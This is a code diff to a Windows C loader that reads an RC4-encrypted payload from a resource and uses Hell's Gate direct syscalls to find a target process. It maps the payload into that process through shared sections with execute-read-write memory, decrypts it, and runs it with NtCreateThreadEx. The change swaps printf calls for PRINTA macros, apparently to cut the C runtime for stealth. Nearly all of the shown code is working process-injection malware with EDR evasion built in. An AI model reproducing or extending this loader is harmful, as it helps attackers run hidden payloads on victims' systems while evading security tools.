@@ -10,7 +10,7 @@ BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	hRsrc = g_Api.pFindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
 	if (hRsrc == NULL) {
 		// in case of function failure 
-		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
+		PRINTA("[!] FindResourceW Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -18,7 +18,7 @@ BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	hGlobal = g_Api.pLoadResource(NULL, hRsrc);
 	if (hGlobal == NULL) {
 		// in case of function failure 
-		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
+		PRINTA("[!] LoadResource Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -26,7 +26,7 @@ BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	*ppPayloadAddress = g_Api.pLockResource(hGlobal);
 	if (*ppPayloadAddress == NULL) {
 		// in case of function failure 
-		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
+		PRINTA("[!] LockResource Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -34,7 +34,7 @@ BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	*pPayloadSize = g_Api.pSizeofResource(NULL, hRsrc);
 	if (*pPayloadSize == 0) {
 		// in case of function failure 
-		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
+		PRINTA("[!] SizeofResource Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
 
@@ -57,7 +57,7 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* 
 	// Allocating enough buffer for the returned array of `SYSTEM_PROCESS_INFORMATION` struct
 	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, uReturnLen1);
 	if (SystemProcInfo == NULL) {
-		printf("[!] HeapAlloc Failed With Error :  0x%0.8X\n", GetLastError());
+		PRINTA("[!] HeapAlloc Failed With Error :  0x%0.8X\n", GetLastError());
 		return FALSE;
 	}
 
@@ -65,10 +65,10 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* 
 	// Calling NtQuerySystemInformation with the correct arguments, the output will be saved to 'SystemProcInfo'
 	HellsGate(g_SyscallsTable.NtQuerySystemInformation.wSystemCall);
 	if ((status = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2) != 0x0)) {
-		printf("[!] HellDescent Failed With Error :  0x%0.8X\n", status);
+		PRINTA("[!] HellDescent Failed With Error :  0x%0.8X\n", status);
 		return FALSE;
 	}
-	printf("[+] Retrieved SystemProcInfo Structure At %p with Actual Retrieved Size: %d\n", SystemProcInfo, uReturnLen2);
+	PRINTA("[+] Retrieved SystemProcInfo Structure At %p with Actual Retrieved Size: %d\n", SystemProcInfo, uReturnLen2);
 
 	// Since we will modify 'SystemProcInfo', we will save its initial value before the while loop to free it later
 	PSYSTEM_PROCESS_INFORMATION pValueToFree = SystemProcInfo;
@@ -124,7 +124,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		SEC_COMMIT,
 		NULL
 	) != 0) {
-		printf("[!] NtCreateSection Failed With Error : 0x%0.8X \n", status);
+		PRINTA("[!] NtCreateSection Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
 
@@ -139,18 +139,18 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		NULL,
 		dwLocalFlag
 	) != 0) {
-		printf("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", status);
+		PRINTA("[!] NtMapViewOfSection [L] Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
 
-	printf("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedAddress, (INT)sViewSize);
+	PRINTA("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedAddress, (INT)sViewSize);
 
 	// Writing the payload
-	printf("[#] Press <Enter> To Write The Payload ... ");
-	getchar();
+	PRINTA("[#] Press <Enter> To Write The Payload ... ");
+	GETCHAR();
 
 	CopyMemoryEx(pAllocatedAddress, pPayload, sPayloadSize);
-	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pAllocatedAddress);
+	PRINTA("\t[+] Payload is Copied From 0x%p To 0x%p \n", pPayload, pAllocatedAddress);
 
 	// Allocating remote map view 
 	if (!bIsLocalInjection) {
@@ -165,15 +165,15 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 			NULL,
 			PAGE_EXECUTE_READWRITE
 		)) != 0x0) {
-			printf("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", status);
+			PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", status);
 			return FALSE;
 		}
-		printf("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedRemoteAddress, (INT)sViewSize);
+		PRINTA("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedRemoteAddress, (INT)sViewSize);
 	}
 
 	// Decrypting the payload
-	printf("[#] Press <Enter> To Decrypt The Payload ... ");
-	getchar();
+	PRINTA("[#] Press <Enter> To Decrypt The Payload ... ");
+	GETCHAR();
 
 	Rc4DecryptionViSystemFunc032(ProtectedKey, pAllocatedAddress, KEY_SIZE, sPayloadSize);
 
@@ -183,10 +183,10 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		pExecAddress = pAllocatedRemoteAddress;
 	}
 
-	printf("[#] Press <Enter> To Run The Payload ... ");
-	getchar();
+	PRINTA("[#] Press <Enter> To Run The Payload ... ");
+	GETCHAR();
 
-	printf("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
+	PRINTA("\t[i] Running Thread Of Entry 0x%p ... ", pExecAddress);
 	HellsGate(g_SyscallsTable.NtCreateThreadEx.wSystemCall);
 	if ((HellDescent(
 		&hThread,
@@ -199,12 +199,12 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		NULL, NULL, NULL,
 		NULL
 	)) != 0x0) {
-		printf("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", status);
+		PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
-	printf("[+] DONE \n");
+	PRINTA("[+] DONE \n");
 	if (hThread != 0x0) {
-		printf("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
+		PRINTA("\t[+] Thread Created With Id : %d \n", GetThreadId(hThread));
 	}
 
 	// Waiting for the thread to finish
@@ -214,7 +214,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		FALSE,
 		NULL
 	)) != 0x0) {
-		printf("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", status);
+		PRINTA("[!] NtWaitForSingleObject Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
 
@@ -224,7 +224,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		hProcess,
 		pAllocatedAddress
 	)) != 0x0) {
-		printf("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", status);
+		PRINTA("[!] NtUnmapViewOfSection Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
 
@@ -233,7 +233,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 	if ((status = HellDescent(
 		hSection
 	)) != 0x0) {
-		printf("[!] NtClose Failed With Error : 0x%0.8X \n", status);
+		PRINTA("[!] NtClose Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
 
